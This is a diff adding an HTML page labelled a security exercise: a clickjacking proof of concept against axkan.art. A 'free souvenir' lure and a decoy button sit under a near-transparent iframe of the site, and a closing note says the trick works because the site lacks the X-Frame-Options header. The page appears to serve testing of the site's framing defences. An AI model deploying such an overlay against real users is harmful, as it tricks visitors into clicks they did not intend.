@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head><title>AXKAN Security Exercise - Clickjacking PoC</title></head>
+<body style="margin:0;font-family:Arial;">
+
+<h1 style="text-align:center;margin-top:50px;">Congratulations! You won a free souvenir!</h1>
+<p style="text-align:center;font-size:18px;">Click the button below to claim your prize:</p>
+
+<!-- The real axkan.art page is hidden behind this button -->
+<div style="position:relative;width:800px;height:600px;margin:20px auto;">
+  <!-- Invisible iframe loading the real site -->
+  <iframe
+    src="https://axkan.art"
+    style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.15;z-index:2;border:none;">
+  </iframe>
+
+  <!-- Fake button the user thinks they're clicking -->
+  <button style="position:absolute;top:250px;left:300px;z-index:1;font-size:24px;padding:15px 40px;background:#e72a88;color:white;border:none;border-radius:10px;cursor:pointer;">
+    CLAIM FREE SOUVENIR
+  </button>
+</div>
+
+<p style="text-align:center;color:red;margin-top:20px;">
+  <strong>SECURITY EXERCISE:</strong> The transparent overlay above is axkan.art loaded in an iframe.<br>
+  The user thinks they're clicking "CLAIM FREE SOUVENIR" but they're actually clicking on axkan.art.<br>
+  This works because axkan.art is missing the X-Frame-Options header.
+</p>
+
+</body>
+</html>
